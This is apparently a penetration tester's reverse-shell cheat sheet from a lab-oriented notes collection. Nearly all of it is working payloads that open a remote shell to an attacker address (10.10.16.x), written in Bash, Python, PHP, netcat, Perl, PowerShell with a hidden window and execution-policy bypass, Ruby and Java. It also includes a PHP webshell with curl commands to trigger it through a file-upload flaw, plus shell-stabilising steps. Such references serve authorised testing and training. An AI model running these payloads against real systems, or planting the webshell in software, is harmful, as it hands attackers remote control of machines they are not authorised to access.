---
type: cheatsheet
phase: foothold
tags: [reverse-shell, shell, netcat, bash, python, php, cheatsheet]
---

## Step 0 — Start your listener

```bash
nc -lvnp 4444
```

---

## Bash

```bash
bash -i >& /dev/tcp/10.10.16.x/4444 0>&1
```

URL-encoded (for GET parameter or Burp Repeater request line):
```
bash%20-i%20%3E%26%20/dev/tcp/10.10.16.x/4444%200%3E%261
```

> Always URL-encode when triggering via a GET param. Unencoded `&`, `>`, spaces break the HTTP request line and return 400. In Burp: select the value and hit Ctrl+U.

---

## Python 3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## PHP

PHP webshell — upload via file upload vuln, trigger with curl:
```php
<?php system($_GET['cmd']); ?>
```

```bash
# Confirm RCE
curl "http://target.htb/uploads/shell.php?cmd=id"

# Trigger reverse shell (URL-encoded bash payload)
curl "http://target.htb/uploads/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/10.10.16.x/4444%200%3E%261"
```

PHP one-liner:
```bash
php -r '$sock=fsockopen("10.10.16.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Netcat

With `-e` flag (older nc versions):
```bash
nc -e /bin/sh 10.10.16.x 4444
```

Without `-e` (FIFO method — works on most modern Linux):
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.x 4444 > /tmp/f
```

---

## Perl

```bash
perl -e 'use Socket;$i="10.10.16.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## PowerShell (Windows targets)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.16.x",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.16.x","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.16.x/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## TTY Upgrade

After catching any shell, upgrade it to a full interactive TTY immediately — without it, tab completion, vim, sudo, and interactive prompts all break.

```bash
# Option 1 — python pty (quick)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Option 2 — script (full TTY, preferred)
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# type: reset   ->  terminal type: xterm
export TERM=xterm
export SHELL=bash
```

---

## msfvenom — standalone payload files

For generating reverse shells as `.exe`, `.elf`, `.php`, `.war` etc, see [[msfvenom]].

---

## Related
- [[netcat]]
- [[msfvenom]]
- [[Burp Suite]]
- [[Unrestricted File Upload RCE]]
- [[Pentest Web Cheatsheet]]
